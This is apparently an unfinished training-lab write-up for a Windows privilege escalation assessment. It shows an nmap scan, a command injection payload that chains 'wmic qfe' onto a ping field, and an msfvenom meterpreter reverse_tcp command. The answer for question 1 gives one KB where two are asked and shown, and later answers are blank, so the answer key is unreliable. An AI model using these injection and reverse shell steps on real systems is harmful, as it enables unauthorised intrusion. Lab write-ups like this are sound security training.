# Windows Privilege Escalation Skills Assessment - Part I
During a penetration test against the INLANEFREIGHT organization, you encounter a non-domain joined Windows server host that suffers from an unpatched command injection vulnerability. After gaining a foothold, you come across credentials that may be useful for lateral movement later in the assessment and uncover another flaw that can be leveraged to escalate privileges on the target host.

For this assessment, assume that your client has a relatively mature patch/vulnerability management program but is understaffed and unaware of many of the best practices around configuration management, which could leave a host open to privilege escalation.

Enumerate the host (starting with an Nmap port scan to identify accessible ports/services), leverage the command injection flaw to gain reverse shell access, escalate privileges to `NT AUTHORITY\SYSTEM` level or similar access, and answer the questions below to complete this portion of the assessment.

## Questions
1. Which two KBs are installed on the target system? (Answer format: 3210000&3210060) **Answer: 3200970**
   - Run a nmap scan, identified port 80 and 3389 open:
        ```shellsession
        $ sudo nmap -sV -sC -Pn -p- --disable-arp-ping 10.129.105.95
        Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-17 04:21 EDT
        Nmap scan report for 10.129.105.95
        Host is up (0.15s latency).
        Not shown: 65533 filtered tcp ports (no-response)
        PORT     STATE SERVICE       VERSION
        80/tcp   open  http          Microsoft IIS httpd 10.0
        |_http-title: DEV Connection Tester
        | http-methods: 
        |_  Potentially risky methods: TRACE
        |_http-server-header: Microsoft-IIS/10.0
        3389/tcp open  ms-wbt-server Microsoft Terminal Services
        |_ssl-date: 2026-07-17T08:23:57+00:00; -3s from scanner time.
        | rdp-ntlm-info: 
        |   Target_Name: WINLPE-SKILLS1-
        |   NetBIOS_Domain_Name: WINLPE-SKILLS1-
        |   NetBIOS_Computer_Name: WINLPE-SKILLS1-
        |   DNS_Domain_Name: WINLPE-SKILLS1-SRV
        |   DNS_Computer_Name: WINLPE-SKILLS1-SRV
        |   Product_Version: 10.0.14393
        |_  System_Time: 2026-07-17T08:23:52+00:00
        | ssl-cert: Subject: commonName=WINLPE-SKILLS1-SRV
        | Not valid before: 2026-07-16T08:12:10
        |_Not valid after:  2027-01-15T08:12:10
        Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
        ```
   - Found and exploit the command injection vulnerability on the web:
        ```
        POST / HTTP/1.1

        <SNIP>addr=127.0.0.1+%26%26+wmic+qfe+list+brief+<SNIP>
        ```
        ```
        Pinging 127.0.0.1 with 32 bytes of data:
        Reply from 127.0.0.1: bytes=32 time&lt;1ms TTL=128
        Reply from 127.0.0.1: bytes=32 time&lt;1ms TTL=128

        Ping statistics for 127.0.0.1:
            Packets: Sent = 2, Received = 2, Lost = 0 (0% loss),
        Approximate round trip times in milli-seconds:
            Minimum = 0ms, Maximum = 0ms, Average = 0ms
        Description      FixComments  HotFixID   InstallDate  InstalledBy          InstalledOn  Name  ServicePackInEffect  Status  

        Update                        KB3199986               NT AUTHORITY\SYSTEM  11/21/2016                                      

        Security Update               KB3200970               NT AUTHORITY\SYSTEM  11/21/2016  
        
        <SNIP>
        ```
2. Find the password for the ldapadmin account somewhere on the system. **Answer:**
   - Gain reverse shell using meterpreter shell:
        ```shellsession
        $ msfvenom -p windows/x64/meterpreter/reverse_tcp
        ```
   - 
3. Escalate privileges and submit the contents of the flag.txt file on the Administrator Desktop.
 **Answer:**
1. After escalating privileges, locate a file named confidential.txt. Submit the contents of this file. **Answer:**